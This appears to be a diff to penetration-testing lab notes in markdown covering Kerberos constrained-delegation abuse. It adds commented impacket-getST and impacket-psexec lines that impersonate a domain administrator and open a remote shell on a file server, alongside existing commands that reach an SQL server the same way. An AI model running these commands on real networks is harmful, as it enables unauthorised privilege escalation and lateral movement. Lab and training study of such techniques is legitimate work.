@@ -208,6 +208,7 @@ nslookup appsrv01
 * Obtain a Service Ticket (ST) for MSSQL Service as Administrator
   *   ```powershell
       impacket-getST -spn mssqlsvc/sql01.corp.com:1433 -impersonate administrator corp.com/iissvc -k -no-pass
+      # impacket-getST -spn cifs/file02 -impersonate administrator cowmotors.com/svc_file -k -no-pass -dc-ip 172.16.199.100
       export KRB5CCNAME=administrator.ccache
       ```
 
@@ -215,6 +216,7 @@ nslookup appsrv01
 * Access the SQL Server as Administrator
   *   ```powershell
       impacket-mssqlclient sql01.corp.com -k
+      # impacket-psexec administrator@file02 -k -no-pass -dc-ip 172.16.199.100
       ```
 
 
